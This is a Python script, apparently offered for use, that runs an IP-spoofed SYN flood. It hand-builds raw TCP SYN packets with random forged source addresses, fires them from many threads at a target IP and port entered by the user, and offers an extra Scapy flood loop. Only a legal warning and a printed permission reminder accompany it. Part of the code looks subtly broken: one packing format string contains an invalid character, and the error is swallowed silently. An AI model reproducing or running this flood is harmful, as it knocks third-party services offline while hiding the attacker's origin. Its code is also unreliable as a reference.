import socket
import random
import struct
import threading
import time
import os
from scapy.all import *

# === ADVANCED IP-SPOOFED SYN FLOOD ATTACK SCRIPT ===
# WARNING: FOR AUTHORIZED SECURITY TESTING ONLY
# UNAUTHORIZED USE IS A FELONY IN ROMANIA (Law 161/2003) & EU

def spoofed_ip():
    """Generate random spoofed source IP"""
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = msg[i] + (msg[i+1] << 8)
        s += w
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s

def create_ip_header(src_ip, dest_ip):
    version = 4
    ihl = 5
    type_of_service = 0
    total_length = 40
    identification = random.randint(1, 65535)
    fragment_offset = 0
    ttl = 64
    protocol = socket.IPPROTO_TCP
    header_checksum = 0
    source_address = socket.inet_aton(src_ip)
    destination_address = socket.inet_aton(dest_ip)
    
    ihl_version = (version << 4) + ihl
    ip_header = struct.pack('!BBHHHBBH4s4s',
                            ihl_version, type_of_service, total_length,
                            identification, fragment_offset, ttl,
                            protocol, header_checksum,
                            source_address, destination_address)
    
    return ip_header

def create_tcp_syn(src_ip, dest_ip, src_port, dest_port):
    seq = random.randint(1000, 900000)
    ack_seq = 0
    doff = 5
    window = socket.htons(5840)
    urg_ptr = 0
    offset_res = (doff << 4) + 0
    tcp_flags = 2  # SYN
    tcp_header = struct.pack('!HHLLBBHHH',
                             src_port, dest_port, seq, ack_seq,
                             offset_res, tcp_flags, window,
                             0, urg_ptr)
    
    # Pseudo header for checksum
    src_addr = socket.inet_aton(src_ip)
    dest_addr = socket.inet_aton(dest_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)
    
    psh = struct.pack('!4s4sBBH',
                      src_addr, dest_addr, placeholder,
                      protocol, tcp_length)
    psh += tcp_header
    
    tcp_checksum = checksum(psh)
    
    # Rebuild TCP header with checksum
    tcp_header = struct.pack('!HHLLBBHH-H',
                             src_port, dest_port, seq, ack_seq,
                             offset_res, tcp_flags, window,
                             tcp_checksum, urg_ptr)
    
    return tcp_header

def syn_flood(target_ip, target_port, threads=500, duration=300):
    print(f"[!] Launching spoofed SYN flood on {target_ip}:{target_port}")
    print(f"[!] Threads: {threads} | Duration: {duration}s")
    print(f"[!] WARNING: Only use on systems you own or have written permission for!")
    
    end_time = time.time() + duration
    
    def attack():
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                src_ip = spoofed_ip()
                src_port = random.randint(1024, 65535)
                
                ip_header = create_ip_header(src_ip, target_ip)
                tcp_header = create_tcp_syn(src_ip, target_ip, src_port, target_port)
                
                packet = ip_header + tcp_header
                s.sendto(packet, (target_ip, 0))
                
            except Exception as e:
                pass
            finally:
                if 's' in locals():
                    s.close()
    
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=attack)
        t.daemon = True
        thread_list.append(t)
        t.start()
    
    for t in thread_list:
        t.join()

# === SCAPY HIGH-PERFORMANCE SPOOFED FLOOD ===
def scapy_flood(target, port, count=100000):
    print(f"[!] Sending {count} spoofed SYN packets via Scapy...")
    for _ in range(count):
        ip = IP(src=RandIP(), dst=target)
        tcp = TCP(sport=RandShort(), dport=port, flags="S")
        send(ip/tcp, verbose=0)

# === MAIN EXECUTION ===
if __name__ == "__main__":
    target = input("Target IP: ").strip()
    port = int(input("Target Port: "))
    threads = int(input("Threads (500-2000): "))
    duration = int(input("Duration (seconds): "))
    
    print("\n" + "="*60)
    print("SPOOFED SYN FLOOD INITIATED".center(60))
    print("="*60)
    
    # Raw socket flood
    syn_flood(target, port, threads, duration)
    
    # Optional Scapy boost
    boost = input("\nRun Scapy high-speed boost? (y/n): ")
    if boost.lower() == 'y':
        scapy_flood(target, port)
    
    print("\n[!] Attack completed.")